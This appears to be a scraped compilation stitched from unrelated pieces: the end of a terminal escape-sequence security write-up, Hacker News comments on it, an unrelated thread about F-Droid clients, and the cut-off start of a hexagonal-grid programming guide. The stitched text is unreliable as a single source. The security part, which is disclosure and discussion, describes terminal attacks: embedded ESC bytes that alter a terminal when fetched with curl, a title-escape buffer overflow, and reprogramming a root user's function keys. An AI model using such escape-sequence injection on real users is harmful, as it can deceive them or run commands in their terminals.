\"pointer/overflow fixes\". To exploit this requires running several processes, as a single line in top cannot contain much data. It was easiest to arrange for the processes to consume different amounts of memory, rather than carefully controlling CPU usage. xterm CVE-2023-40359 exploit Aside: busybox ps and top are also vulnerable to similar, I reported this but they haven't been fixed yet. Testing One surprising outcome from this research was how variants of previous CVEs existed in other terminals. To that end, I would like to make it easy for anyone to test terminals against known terminal CVEs. I've written a tool which runs as an SSH server and runs some tests against terminals. I plan to collect many more CVEs into this, so the code will serve as a collection of terminal vulnerabilities. The tool is available at https://github.com/dgl/vt-houdini or can be accessed via SSH: ssh termtest.dgl.cx This is an example of a vulnerable version of iTerm2 being tested by the terminal tester. Other protections Tools like screen and tmux work by essentially emulating a terminal within your terminal. You may think this provides a layer of isolation from your actual terminal, however this is a false sense of security, screen has an escape sequence to pass straight through to the actual terminal. Tmux also has an escape sequence, but version 3.3 turns off allow-passthrough by default, so tmux with allow-passthrough turned off does provide some protection. (There are reasons to use passthrough, for example hterm provides a script which can set the system clipboard from even within a screen session, as usual security is a trade-off.) One interesting tool is mosh, which primarily exists to reduce latency of SSH sessions, it does this by emulating a terminal on the server side and sending diffs (and other tricks), rather than simply sending escape sequences over the wire. As a result of this, its terminal implementation is fully isolated from the terminal the user uses. Some terminals have options to disable potentially insecure escape sequences. Often this is on by default and changing it will bring back some of the known insecure sequences discussed here, so that is not recommended, but is potentially useful for testing. (For example rxvt-unicode has an -insecure option and if enabled \"\\e[7n\" will reply with a response including a newline.) iTerm2 has sensible defaults (it disables title reporting), but it also has an advanced option to disable \"Potentially Insecure\" escape sequences. A paranoid user may turn that on (for example that setting mitigated some of solid-snail's findings). Terminals to avoid Sometimes software is beyond help. I do not recommend anyone uses Terminology. It is vulnerable by default, but the author doesn't consider it a security issue, based on someone else's report from 2015. See this commit Additionally some terminals support C1 controls in UTF-8 encoded text, which per this 2015 posting to oss-security is problematic. Some terminals have the ability to turn this off, if they do not such as Kitty I cannot recommend their use. Summary This research found quite simple variants of vulnerabilities from 2003 and 2008, as well as some novel new vulnerabilities and ways to exploit them. These vulnerabilities have the potential to be used in various kind of attacks, but in particular given they can be used to attack developers and administrators they are of particular relevance in securing the software supply chain. I believe by addressing and understanding these issues we can help to make the software supply chain more secure. While this paper does include some unfixed issues I believe the most serious bugs which could have been used for supply chain attacks are addressed and disclosing all this can help make the open source world a safer place.

This means that running: curl https:&#x2F;&#x2F;www.osnews.com&#x2F;story&#x2F;137552&#x2F;31m-ansi-terminal-security-in-2023-and-finding-10-cves&#x2F;...will turn your screen red because of the embedded \"\u001b[31m\". Obviously this is just harmless fun (would have been more fun to get iTerm2&#x27;s \"\u001b]1337;RequestAttention=fireworks\u0007\", like my curl ip.wtf&#x2F;moo does, but I couldn&#x27;t really stick that in the title innocently), but an attacker might be able to find a way to social engineer someone into running \"curl\" or similar on what looks like a trustworthy site.edit: Hacker News also doesn&#x27;t sanitize escape characters, so this very comment will turn your screen red: curl &#x27;https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=37963815&#x27; reply Wicher 1 hour agoparentRight on.

Much like Busybox, which has been known for years.) reply Wicher 57 minutes agorootparentInteresting that they didn&#x27;t fix it.I emailed the Tar maintainers privately because I thought they might consider it a security vulnerability, however mild. They fixed it promptly but didn&#x27;t want to make a CVE fuss out of it. reply mongol 1 hour agoparentprevI don&#x27;t think we should expect websites to sanitize escape characters. But tools such as curl perhaps should have (or already has?) some option to do it. reply Wicher 38 minutes agorootparentOr extension of the POSIX terminal control flags could result in gaining a mode, which the curls and tars of this world would use, to express to a terminal \"ignore any terminal control code I write out; I don&#x27;t actually mean it\".But this would require coordination in POSIX, in the terminals, and in programs using the terminal :-&#x2F;But the advantage would be that then you&#x27;d be able to put your terminal into this safe mode by default. And the terminal can alert you when a program is writing out control codes that are being ignored, and then you can whitelist them and&#x2F;or get those programs fixed to fence off their sections of \"I&#x27;m going to output data from god-knows-where now\" with this new terminal mode.It&#x27;s not going to happen but we can dream ;-) reply andrewla 18 hours agoprevEvery time my terminal blows up because I wrote some binary data and I have to run `reset` or `stty sane` I&#x27;m amazed that we let things get to this point. Frankly I&#x27;m surprised that there are not significantly more vulnerabilities.Even things like the use of ESC, and the overloading of ESC for the actual ESC key, for a signal for keycodes, and for the ALT&#x2F;META key are crazy.I&#x27;ve thought for a while that I should implement an extremely reduced set of escape sequences which use a non-ESC character (maybe SOH or something) for control sequences and key encoding. A minimal set -- color &#x2F; cursor position &#x2F; save-screen &#x2F; query-size -- whatever it takes to make vim&#x2F;emacs + tmux&#x2F;screen work, and call it a day. reply ElectricalUnion 17 hours agoparentIn theory, `reset`&#x2F;`tset` from ncurses, or an equivalent, is this \"thing\" that programs are supposed to be using when they need to engage in terminal shenanigans.Those use TERM&#x2F;TERMCAP environment variables and some educated guessing reading stdin&#x2F;stdout&#x2F;stderr behaviour to figure out what terminal you&#x27;re using, search for said entry in terminfo&#x2F;termcap database, and finally invoking native terminal behavior or simulating it with other terminal behavior.In theory, one could \"just implement\" an alternative terminal, and put said simplified entries in terminfo&#x2F;termcap database and things will be all fine.In practice several of those ANSI escape code behaviors are hard-coded and everyone pretends everything is \"at least as capable as xterm\" (a oxymoron, given that xterm is one of the most capable and feature-rich terminals around), so you&#x27;re also gonna have to implement a converter from \"xterm ANSI\" to your alternative terminal system - sort of how winpty does convert Win32 terminals conventions to ANSI ones.Then we&#x27;re back to the starting issue in this converter. reply foresto 16 hours agorootparent> In practice several of those ANSI escape code behaviors are hard-codedThe most common examples I see these days are for red&#x2F;green&#x2F;yellow status text in shell scripts.

The definition has expanded greatly over time, and documentation is poor to non-existent. In many cases termcap&#x2F;terminfo has been implicitly extended to support ncurses specifically. And like you say, everyone just sort of assumes ANSI&#x2F;xterm -- nobody has `PS1=\"$(tput setaf 3)\\w $(tput setaf 0) $\", you just hard-code the codes.The last time I chased the rabbit down this hole I got mired in TTY-land and was not able to dig myself out. Too many insane layers, and before you know it you&#x27;re writing code to emulate serial connections in a vain attempt to make things work without burning the whole world down.Both (n)vim and tmux have internal TTY emulation as well which makes things even crazier; I think vim uses libvterm and tmux has one internally hand-coded. It&#x27;s a mess. reply db48x 15 hours agorootparenttmux, screen, emacs, and vim all have terminal emulators in them because it’s required, not because they’re crazy.Consider a really simple case. You are using screen (or tmux, or emacs, or whatever) and you have your terminal divided in half so that you can use a program in one half and tail a log file in the other. The program sends a ^L to clear the screen. Screen (or tmux or whatever) must read the ^L and then _not_ send it on. If it sent it on, the whole screen would be cleared, not just the half with the program in it. Instead it has to send whatever control sequences would erase the text from just the right portion of the screen while leaving everything else alone. Virtually everything sent by the program(s) has to be intercepted and reinterpreted in order for it to work right. reply hnlmorg 1 minute agorootparentI agree with your overall point but your example isn&#x27;t a great one because ^L would be handled by the controlling process regardless of the terminal state. You don&#x27;t need any special magic here. And blanking specific sections of a screen wouldn&#x27;t need any special magic unless you&#x27;re launching other processes and forwarding their output to the terminal. But if you&#x27;re not forwarding the output of other processes then you can use standard ANSI escape sequences (or even just \\s) to blank specific parts of the screen.\\s is a bit hacky for blanking though, it can produce some undesired results in terms of copy&#x2F;pasting from the terminal and resizing. But if you&#x27;ve got a \"full screen\" process like you&#x27;re describing, you&#x27;d be trapping SIGWINCH for resize events anyway. kps 13 hours agorootparentprevNo, they&#x27;re crazy. I already have a window manager I like; I don&#x27;t need my terminal to implement their own half-assed one, and my multiplexer (running on the terminal) to implement their own half-assed one, and my editor (running on the multiplexer on the terminal) to implement their own half-assed one. reply hnlmorg 12 hours agorootparentSo don&#x27;t use tmux then. The entire reason most people use something like tmux is because they want a window manager in their terminal.This is one of the great joys of FOSS, if you don&#x27;t like a terminal-based utility then you can bet there&#x27;s a dozen other options available for you to use. reply matvore 11 hours agorootparentprevnext [–]> No, they&#x27;re crazy. I already have a window manager I like; I don&#x27;t need my > terminal to implement their own half-assed one,Basically agree, though note that ssh and dtach and similar tools need to create pty&#x27;s on the server and client ends because they implement essentially an adapter between a tty and a byte stream. reply db48x 12 hours agorootparentprevIf you really want crazy, run `xterm -ti 340`, then run run an X server from the xserver-sixel repositoryin it. Now y ou can run as many terminal emulators, complete with real truetype fonts and all the colors you could want, inside the one terminal. Use a tiling window manager and you’ll be able to avoid using tmux entirely. reply hnlmorg 13 hours agorootparentprevTerminal multiplexers like tmux need to create a pseudo-TTYs otherwise they couldn’t multiplex your terminal.My shell also creates PTYs on some rare occasions too. I’d prefer not to because it’s messy but sometimes there’s no way around it if you want your command line applications to behave like they would on a TTY whilst still having your utility capture that applications output as if it were writing to a pipe.This is a limitation of TTYs.The most annoying part of it all is that creating a PTY differs from one Unix-like OS to another. So it’s definitely not a rabbit hole developers go down happily. reply kps 13 hours agorootparent> Terminal multiplexers like tmux need to create a pseudo-TTYs otherwise they couldn’t multiplex your terminal.[Edit: I misread the parent comment as saying multiplexers needed to do terminal emulation. Dtach only multiplexes (using pesudo-TTYs, of course) but unlike screen or tmux does not do terminal emulation.

I was able to grok it in just a couple of minutes. Kudos to the author. reply kps 11 hours agorootparentYes, I misread your comment, sorry, having had my mind stuck on terminal emulation. reply hnlmorg 3 hours agorootparentA PTY is an intrinsic part of terminal emulation.I think what you’re alluding to is that tmux gobbles up escape sequences (which is configurable by the way) and tracks cell positions. But as I said in another comment, the value add of tmux is its window management capabilities. That’s precisely why people like myself use it. And you cannot have that without complexity. In some edge cases that complexity causes issues, but on the whole I’m more productive for it.Saying it’s stupid that tmux does that is like saying it’s stupid that motorbikes have gears and fast patrol engines when a bmx works just as well. Sure, to someone who’s never seen a bike before they both look similar. But don’t be fooled by the fact that they both have 2 wheels because they cater to very different needs, hence their very different engineering designs. replykps 15 hours agorootparentprevSeveral popular terminals default to calling themselves xterm (e.g. `TERM=xterm-256color`), but are not xterm-compatible, and ignore bug reports (*cough* GNOME *cough*). reply audidude 10 hours agorootparentInteresting.

The escape character was originally only there as an escape character at the start of a control sequence. It was added to the keyboard back in the teletype era specifically so that the operator could control the behavior of the device on the other end. And it was labeled “Alt Mode”!

The vast, _vast_ majority of Unix command-line or text-based programs do not use the Esc key because they were not written with a particular terminal or keyboard layout in mind. (Unlike vim.)But for whatever it&#x27;s worth, I use vim every day and I notice no 1 second delay when switching modes with the Esc key, so perhaps this is something you can configure in your terminal. reply matvore 12 hours agorootparentnext [–]> I notice no 1 second delay when switching modes with the Esc key, so perhaps > this is something you can configure in your terminal.This is configurable in Vim. ttimeoutlen, timeoutlen, and noesckeys are pertinent. tmux et al may also need tweaking. reply mfontani 13 hours agorootparentprevCtrl + [ instead of Esc gets one back into normal mode, with no delay Takes a while getting used to it (I still haven&#x27;t) reply matvore 12 hours agorootparentWhat does `Ctrl + [` send to the terminal for you if not esc? In my experience these are always the same, so Vim shouldn&#x27;t be able to tell the difference unless it&#x27;s a GUI-integrated version like gVim.Try to run `xxd` and then press Ctrl-V and either Ctrl+[ or Esc, then Enter and Ctrl+D. Typical terminal setups will show the same codes both times (1b0a for esc and \\n).Alt+Space (or Alt+J Alt+K Alt+B to go up, down, left one word from current position after returning to normal mode) is what I often do which should work universally. reply blueflow 16 hours agorootparentprevIf you type in junk into the keyboard, junk is what you get on the screen. I see the fault with the developers that overload the keys for existing control characters with a different meaning.> whatever the application wants to use it forWith the application being a terminal emulator, that is emitting an ESC character. reply MatthiasPortzel 15 hours agorootparentprevIs your terminal emulator waiting for a second input before sending Esc? That’s not a common behavior AFAIK. reply blueflow 15 hours agorootparentNo, its waiting for input after sending escape. Escape + character is how you reach the C1 control codes, with CSI and OSC (ESC + &#x27;[&#x27; and ESC + &#x27;]&#x27;) being popular ones (both referred to in the posted article). This is relevant for keyboard input (as contrasted to output-only) since some codes for special keys (like arrow keys) start with CSI.Edit: You asked about the terminal emulator, but its the console application that has to do the wait. reply hnlmorg 12 hours agorootparentAre you using something like tmux: https:&#x2F;&#x2F;unix.stackexchange.com&#x2F;questions&#x2F;608142&#x2F;whats-the-ef... replyjandrese 12 hours agoparentprevTerminal behavior dates back to a time when everybody was just making stuff up because there were no established standards or even conventions. What standards we have are mostly just whatever the most popular or longest lived company did.Terminals are in a bad place because there was a whole lot of effort put towards compatibility instead of standardization. The same curse that email suffers under. So the \"standards\" end up hopelessly complex and also terribly vague because they&#x27;re trying to support every dumb thing every single company did at the same time. And the worst part is that most all of those companies would cease to exist in short order afterward, so the system is chock full of bug-accurate support for long dead systems that literally nobody uses anymore. reply 1vuio0pswjnm7 5 hours agoparentprev\"Every time my terminal blows up because I wrote some binary data and I have to run `reset` or `stty sane` I&#x27;m amazed that we let things get to this point.\"Rather than reset or stty sane, I use something like one of the following, based on what software is available, e.g., there is no reset on NetBSD echo w1b63|ired -n &#x2F;dev&#x2F;stdout echo 1b63|xxd -p -r echo -e &#x27;27\\n99\\n&#x27;|nc-data -g printf \\\\33c reply candiddevmike 17 hours agoparentprevI don&#x27;t know what magic combination it is but I keep hitting something on WSL2 and Windows Terminal that makes my session freeze into a blinking cursor.

I’m embarrassed to have been making fun of our elder gods without even realizing it. They really were gods for creating such devices, given the constraints at the time.

The phone system of old suffered from this (which is why Phreaking was a thing in the first place), various radio based signalling systems had it, HTML has it and terminal streams have them too. It&#x27;s unavoidable, so you may as well assume that these issues are there if you decide to use a protocol that doesn&#x27;t cleanly separate data and control. reply westurner 16 hours agoparentnbformat .ipynb notebooks are JSON documents with distinctions between input and output cells, and with output MIME types. https:&#x2F;&#x2F;nbformat.readthedocs.io&#x2F;en&#x2F;latest&#x2F;format_description...Jupyter-book docs > Code outputs > ANSI outputs: https:&#x2F;&#x2F;jupyterbook.org&#x2F;en&#x2F;stable&#x2F;content&#x2F;code-outputs.html#...`less -R` is not the default.FWIW, textual (and urwid) does ANSII escape codes well: https:&#x2F;&#x2F;github.com&#x2F;Textualize&#x2F;textual touch file$&#x27;\\n&#x27;name find . -print0xargs -0 reply echoangle 16 hours agoparentprevIsn’t it pretty easy to use inband signaling securely?

This was because someone had discovered that you could use `write` to send a message to root if it&#x27;d been left logged in that contained the control codes to re-program a function key and then query the function key back.

Then using a command like \"cat\" to output a binary data to the screen would cause no unfortunate side effects under any conditions, a program would have to use a different interface to control the terminal, even to move the cursor from one place to another or to clear the screen. A proper terminal should not even process backspace characters unless they arrive via a control channel rather than the data channel, let alone process all sorts of other more dangerous control sequences. reply wslh 13 hours agoprevGreat, but please include other vulnerabilities, including exploits, like mine in 1999 [1]: In the xterm there is a feature to change the title of the window. You can change the title of the window sending one of the escape codes of the xterm. (linux: man console_codes) By Example: ESC]2;This is my Xterm^G This escape code changes the xterm&#x27;s title to \"This is my Xterm\" Obviously You can do the same using the kvt (Kde Virtual Terminal). But the kvt has a buffer overflow. If the size of the new title of the window is big enough then the kvt will do a core dump. This bug follows the \"reverse exploit\" line, if some program sends this escape code to the kvt. For Example, When someone connects to any ftp server and the server sends the Welcome Message, It will be easy to exploit this bug changing the Welcome Message (in the .message file) to one with this escape code and to cause a buffer overflow. Another example where someone can cause a buffer overflow in your machine is simply doing \"cat hosts\" where hosts may be a file that you received by mail containing the \"change window escape code\". This bug shows some of the kvt&#x27;s security problems being exploited via a \"reverse exploit\" or a exploit sent directly to your terminal (if the attacker can write to your kvt) If this bug is exploited, then the attacker can obtain the privileges of the kvt&#x27;s owner and execute some arbitrary code as this user. [I found after] This bug was reported to the kde team by Larry Granroth in January.

Why don&#x27;t terminal emulators already work the way mosh does, decoupling the terminal part and the rendering part?I assume it is possible to ingest a stream of terminal data much faster than rendering it (obviously keeping track of what is needed to render). Then the render loop can happen independently at a certain framerate, like a game engine.

A lot of the poor perceived performance over high-latency links happens because ssh puts your terminal into raw mode, so even if the line is being echoed back, that is going all the way to the remote system and back again.It&#x27;s actually possible to fix line editing in ssh, without using something like mosh, see for example https:&#x2F;&#x2F;github.com&#x2F;hyc&#x2F;OpenSSH-LINEMODE.

This was on a VAX&#x2F;VMS system.Someone (I don&#x27;t remember who did what here) discovered that they could get `SHOW SYSTEM` (roughly analogous to unix `ps` command) to display their name in reverse video by adding escape sequences to their process name. So a bunch of us started experimenting to see what else we could embed in there.Most of the terminals attached to the VAX were Zenith Z-19s, which mostly emulated DEC VT-52s but with some added features. One of those added features was an enablable 25th line (in addition to the regular 24x80 display) that functioned as a sort of status line. We found we could enable that, write something into it, then use the \"transmit 25th line\" escape sequence to send its contents back to the VAX. I remember having to work around limitations like it sending an escape sequence before the 25th line (which confused VMS), and I think it didn&#x27;t send a carriage return at the end... or something like that.I don&#x27;t think we ever got it to do anything terribly interesting, but it was fun to play with.

My recommendation would be to not use these terminals with untrusted data.It seems the author didn&#x27;t look at the code because in VTE, bytes enter UTF-8 decoder first and therefore the parser is already dealing with 32-bit unichars. reply dgl 9 hours agoparent(Author here.)I agree the only correct way C1 controls can work is encoded within UTF-8 data, else nothing works.The context is escaping C0 control characters is simple, you look for a single byte and filter it as you need. C1 controls when not encoded as UTF-8 are also single byte characters and therefore easy to filter out. For multi-byte encodings, you need to correctly decode the encoding, then filter, this has synchronisation problems and is tricky[1] (particularly as a Unix byte stream doesn&#x27;t tell you it&#x27;s encoding, although you can assume if someone is trying to display it as text it is probably UTF-8 these days).I should probably expand on that recommendation more, there&#x27;s a lot in the paper, but the crux of the issue is C1 controls are a legacy thing and serve no useful purpose anymore and as I&#x27;ve shown there are enough issues just dealing with C0 controls.If C1 controls are encoded as UTF-8 as is the only way they can work on a modern system, then they take up as many bytes as C0 controls (e.g. CSI is \"\\e[\" or U+009B, which encoded as UTF-8 is 0xC2 0x9B) so they don&#x27;t even save bytes on the wire.[1]: see https:&#x2F;&#x2F;www.openwall.com&#x2F;lists&#x2F;oss-security&#x2F;2015&#x2F;09&#x2F;20&#x2F;1 and some replies to that. reply sargstuff 13 hours agoprevOld school reasoning why memory 0 page for a process is by default read only?Python provided a more modern variation on the ansi escape sequence issues theme with multi-mapping UTF to single point ascii[0].cue \"more things change, more they stay the same\" meme[0] : http:&#x2F;&#x2F;godatadriven.com&#x2F;blog&#x2F;handling-encoding-issues-with-u... reply DonHopkins 16 hours agoprevI wrote a VT100 (+ Sun extensions) emulator in PostScript that had a magical \"^_PostScript Code^]\" escape sequence that let you download arbitrary PostScript code into the NeWS window server (which could do anything you want)!

That said, I usually just use the F-Droid app to install an alternate client (yes, I could download clients manually...).There&#x27;s Neo Store[0] which is a fork of Droid-ify[1] which itself is a fork of Foxy Droid[2] (no longer updated). Personally I use Neo Store, includes more repos by default and can auto update apps.[0]: https:&#x2F;&#x2F;github.com&#x2F;NeoApplications&#x2F;Neo-Store[1]: https:&#x2F;&#x2F;github.com&#x2F;Droid-ify&#x2F;client[2]: https:&#x2F;&#x2F;github.com&#x2F;kitsunyan&#x2F;foxy-droid reply szszrk 5 hours agoparentThere is F-droid Basic, which lacks a few less popular functions but contains a rework of app installation. It can install apps in background as well. It&#x27;s very smooth in my case, works pretty much like auto updating on play store.You can get it through... regular fdroid! reply fold3 5 hours agorootparentI could not make it work. Did you had to do anything special?From what I learned, only apps that target Android 12and above could have this background update feature. I&#x27;m on Android 13 but none of the apps I use updated. I had to switch back to using the f-droid privileged extension. reply szszrk 2 hours agorootparentNo, it just worked, just the usual \"allow this app to install software\" thing.I&#x27;m on Android 13 currently, I don&#x27;t have root, stock OS. All my apps update, including ones that are marked in Fdroid as \"created for older Android releases\". I use around 15 apps from that source and none caused me much trouble. A few times had to invoke installation manually, but honestly I think it would update automatically with more patience on my side.That&#x27;s why I&#x27;m so pumped about Fdroid Basic - it&#x27;s a much better experience. reply mid-kid 2 hours agorootparentprevA store can only auto-update apps when they&#x27;ve been first installed through it. The first time you update an app with neo store you&#x27;ll have to do it manually, any update after that will be automatic. reply JuanSucks 3 hours agoparentprevIt&#x27;s a shame Aurora Droid[0] isn&#x27;t maintained anymore, I found its UI to be far easier to use than the alternatives like you mentioned.[0]: https:&#x2F;&#x2F;gitlab.com&#x2F;AuroraOSS&#x2F;auroradroid reply privacyking 6 hours agoparentprevWhat makes neostore better than droidify? I used to use the former but switched to the latter a year ago. reply sphars 5 hours agorootparentI&#x27;ve personally found the notifications that updates are available to be more consistent with Neo Store over Droid-ify. (I&#x27;ve had both installed at the same time, Neo always showed up first, despite the same settings).I was a user of the latter initially when it started as a fork of Foxy Droid. At one point development slowed down and Neo Store was created and had active development, and I&#x27;ve used that ever since. Both are still actively developed as far as I know. reply unstuck3958 3 hours agorootparentprev> What makes neostore better than droidify?My experience has been the opposite: droidify has been more \"stable\" than neostore for me. reply mackrevinack 3 hours agoparentprevnice. i like that neo store let&#x27;s you bookmark things reply crote 5 hours agoprevI wish F-Droid showed usage stats.Sorting by \"last updated\" doesn&#x27;t really tell you anything about the app&#x27;s quality, and I really do not want to install and try 30 different apps solving the same problem just to see which one is better. Plenty of people have done so before me, so just tell me which one is the most popular! reply em3rgent0rdr 4 hours agoparentMandatory reporting of usage statistics runs contrary to one of the freedoms inherent to FOSS, that the software is for the user&#x27;s freedom.But surely there should be a way to reconcile no-spying with usage reporting through some voluntary means.

Sorting by last updated is a great way to find the most popular apps, as they&#x27;re generally also the most well-maintained. There&#x27;s little reason to keep updating an app when something else does everything better.The only \"old\" app I keep using is Barcode Scanner (com.google.zxing.client.android), since it&#x27;s a classic that will likely never stop working. reply greentea23 7 hours agoprevI like this app for interfacing with fdroid: https:&#x2F;&#x2F;f-droid.org&#x2F;packages&#x2F;com.machiav3lli.fdroid&#x2F;I also like this CLI for bulk downloading apks for initializing a new device over adb: https:&#x2F;&#x2F;github.com&#x2F;mvdan&#x2F;fdroidclTo get releases faster there is obtanium: https:&#x2F;&#x2F;github.com&#x2F;ImranR98&#x2F;Obtainium reply jhoho 6 hours agoparentThere&#x27;s also F-Droid Basic which targets Android 13 and therefore allows unattended updates without root: https:&#x2F;&#x2F;f-droid.org&#x2F;packages&#x2F;org.fdroid.basic reply cf100clunk 7 hours agoparentprevI second your NeoStore recommendation but I&#x27;m always open to trying others.

On top of that, their eink screens are always black and white, and most often very small.I have a color eink tablet with a 10\" screen. Outside of Chinese companies, there isn&#x27;t anything available. If there was such a google pixel device and I could reflash it and mod it as easily as Chinese devices and without limitations, I would consider it. reply philips 5 hours agorootparentHave you seen the Boox Palma?

You can get one on https:&#x2F;&#x2F;store.bigme.vip&#x2F; the URL looks suspicious but don&#x27;t fall for the official looking bigmestore.com: it&#x27;s run by a dropshipper called good reader, who apparently impersonates several Chinese companies by squatting the .com domain name and pretending to be them, just to raise the prices and in return generally give you a negative service (slower shipping, not saying the truth about unit in stocks or shipping dates...)If you need to know more about this dropshipper shady methods, use your favorite search engine with \"goodeareader scam\" and learn from the various user reports, the BBB ratings or trustpilot.The difficulty was getting a legit Bigme from the official store, but the hardware is great: I think the quality is higher than the Boox (which I already liked a lot), but unfortunately it seems to have a lot more google software than your usual Chinese device.OTOH, there&#x27;s also a 5G module in the BigMe, so I could get data anywhere... it&#x27;s complicated: I might return to Boox when they have a better lineup, but getting either a Boox or a BigMe is a good decision if you like the slower refresh rate of eink and the \"more visceral\" feel of eink compared to emissive technologies (TFT, OLED...)I&#x27;ll try to write some guide like my previous one for the Lenovo X1 Fold: https:&#x2F;&#x2F;csdvrx.github.io&#x2F; reply uoaei 7 hours agorootparentprevI&#x27;m responding to the language in the comment I responded to. With your level of technical expertise it seems like you&#x27;ve figured out a safe enough way to be. reply benatkin 7 hours agorootparentWell, I&#x27;m even less inclined to \"ally\" with the CCP, because I have no devices from Chinese companies, I have a laptop from MSI, a laptop from Apple, a phone from Samsung, and a phone from Apple.I think it&#x27;s a better choice to use a device from Taiwan or South Korea (perhaps more so than the US), but it&#x27;s begrudgingly that I deal with the Google stuff on my Samsung, and I have less Google stuff than I would if not for it being Samsung.I don&#x27;t think owning an Android phone that requires a Google Account is allegiance to Google, but the way Samsung is providing stuff that requires a Google account kinda is, but I can see why, and hopefully one day they stop. I also don&#x27;t think buying a phone from a Chinese company is allegiance to the CCP.That said, I&#x27;d be happy to be called an ally to Taiwan. I&#x27;m not sure if I&#x27;ve earned that yet, but if anyone has any ideas how, let me know! replymainpassathome 7 hours agorootparentprevthey’re cheaper and usually easier to unlock, have more interesting features etc reply sureglymop 3 hours agorootparentAlthough it should be noted that sometimes, these devices need an internet connection or even a registered account with the vendor in order to unlock the bootloader.

F-Droid apps have to be built on F-Droid servers.Some projects like NewPipe have their own repository which has to be added manually.It&#x27;s annoying but mostly not a problem. reply glenstein 8 hours agorootparentTo be clear NewPipe is already on F-Droid, but you can get new releases a bit faster if you add the NewPipe repository in addition to having the default repository. reply riedel 7 hours agorootparentAlso the izzyondroid repo has many other sources reply sigmar 8 hours agoparentprevIt&#x27;s been a while since I&#x27;ve published on fdroid, does it still take 24-48 hrs before updates get pushed after tagging a new release version? reply sureglymop 3 hours agorootparentThat seems amazingly quick for such a project to be honest. reply walteweiss 5 hours agoprevJust yesterday’s evening I was casually browsing through new apps in f-droid (sometimes I do) and found there ‘f-droid lite’ version, or whatever its called. I cannot quickly find it from my iPhone unfortunately.If anyone knows and can elaborate on that very version, I would like to know more. I installed it, and it looks better to me.

    "title": "Hexagonal Grids (2013)",
    "originLink": "https://www.redblobgames.com/grids/hexagons/",
    "originBody": "Hexagonal Grids from Red Blob Games Home Blog Links Twitter About Mar 2013, updated in Mar 2015, Apr 2018, Feb 2019, May 2020, Oct 2021 This guide will cover various ways to make hexagonal grids, the relationships between different approaches, and common formulas and algorithms. I've been collecting hex grid resources for over 25 years. I wrote this guide to the most elegant approaches that lead to the simplest code, starting from the guides by Charles Fu and Clark Verbrugge. Most parts of this page are interactive. Geometry Coordinate systems Conversions Neighbors Distances Line drawing Range Rotation Reflection Rings and Spirals Field of view Hex to pixel Pixel to hex Rounding Map storage Wraparound maps Pathfinding More reading The code samples on this page are written in pseudo-code; they're meant to be easy to read and understand. The implementation guide has code in C++, Javascript, C#, Python, Java, Typescript, and more. Geometry # Hexagons are any 6-sided polygons. Regular hexagons have all the sides the same length. I'll assume all the hexagons we're working with here are regular. Flat-top orientation height = √3 ✕ size width = 2 ✕ size size Pointy-top orientation height = 2 ✕ size width = √3 ✕ size size The size of a regular hexagon can be described by either the inner circle, touching the edges, or the outer circle, touching the corners. On this page, I use the radius of the outer circle as the size. The width and height are defined in terms of the diameters of the two circles. Spacing # Next we want to put several hexagons together. 0w ¼w ½w ¾w 1w 1¼w 1½w 1¾w 2w 2¼w 2½w 0h ¼h ½h ¾h 1h 1¼h 1½h 1¾h 2h horizontal spacing vertical spacing flat pointy In the flat top orientation, the horizontal distance between adjacent hexagons centers is horiz = 3/4 * width = 3/2 * size. The vertical distance is vert = height = sqrt(3) * size. In the pointy top orientation, the horizontal distance between adjacent hexagon centers is horiz = width = sqrt(3) * size. The vertical distance is vert == 3/4 * height == 3/2 * size. Some games use pixel art for hexagons that does not match an exactly regular polygon, and these formulas will have to be adjusted slightly. See the implementation guide for details. Angles # In a regular hexagon the interior angles are 120°. There are six “wedges”, each an equilateral triangle with 60° angles inside. Each corner is size units away from the center. In code: function pointy_hex_corner(center, size, i): var angle_deg = 60 * i - 30° var angle_rad = PI / 180 * angle_deg return Point(center.x + size * cos(angle_rad), center.y + size * sin(angle_rad)) To fill a hexagon, gather the polygon vertices at hex_corner(…, 0) through hex_corner(…, 5). To draw a hexagon outline, use those vertices, and then draw a line back to hex_corner(…, 0). The difference between the two orientations is a rotation, and that causes the angles to change: flat top angles are 0°, 60°, 120°, 180°, 240°, 300° and pointy top angles are 30°, 90°, 150°, 210°, 270°, 330°. Note that the diagrams on this page use the y axis pointing down (angles increase clockwise); you may have to make some adjustments if your y axis points up (angles increase counterclockwise). Coordinate Systems # Now let's assemble hexagons into a grid. With square grids, there's one obvious way to do it. With hexagons, there are multiple approaches. I like cube coordinates for algorithms and axial or doubled for storage. Offset coordinates # The most common approach is to offset every other column or row. Columns are named col (q). Rows are named row (r). You can either offset the odd or the even column/rows, so the horizontal and vertical hexagons each have two variants. “odd-r” horizontal layout shoves odd rows right “even-r” horizontal layout shoves even rows right “odd-q” vertical layout shoves odd columns down “even-q” vertical layout shoves even columns down Cube coordinates # Another way to look at hexagonal grids is to see that there are three primary axes, unlike the two we have for square grids. There's an elegant symmetry with these. Let's take a cube grid and slice out a diagonal plane at x + y + z = 0. This is a weird idea but it helps us with hex grid algorithms: 3d cartesian coordinates follow standard vector operations: we can add/subtract coordinates, multiply/divide by a scalar, etc. We can reuse these operations with hexagonal grids. Offset coordinates do not support these operations. 3d cartesian coordinates have existing algorithms like distances, rotation, reflection, line drawing, conversion to/from screen coordinates, etc. We can adapt these algorithms to work on hexagonal grids. Switch to hexagons Study how the cube coordinates work on the hex grid. Selecting the hexes will highlight the cube coordinates corresponding to the three axes. Each direction on the cube grid corresponds to a line on the hex grid. Try highlighting a hex with r at 0, 1, 2, 3 to see how these are related. The row is marked in blue. Try the same for q (green) and s (purple). Each direction on the hex grid is a combination of two directions on the cube grid. For example, northwest on the hex grid lies between the +s and -r, so every step northwest involves adding 1 to s and subtracting 1 from r. We'll use this property in the neighbors section. The cube coordinates are a reasonable choice for a hex grid coordinate system. The constraint is that q + r + s = 0 so the algorithms must preserve that. The constraint also ensures that there's a canonical coordinate for each hex. Axial coordinates # The axial coordinate system, sometimes called “trapezoidal” or “oblique” or “skewed”, is the same as the cube system except we don't store the s coordinate. Since we have a constraint q + r + s = 0, we can calculate s = -q-r when we need it. The axial/cube system allows us to add, subtract, multiply, and divide with hex coordinates. The offset coordinate systems do not allow this, and that's part of what makes algorithms simpler with axial/cube coordinates. Doubled coordinates # Although I recommend axial/cube coordinates, if you are sticking to offset coordinates, consider the doubled variant. It makes many of the algorithms easier to implement. Instead of alternation, the doubled coordinates double either the horizontal or vertical step size. It has a constraint (col + row) % 2 == 0. In the horizontal (pointy top hex) layout it increases the column by 2 each hex; in the vertical (flat top hex) layout it increases the 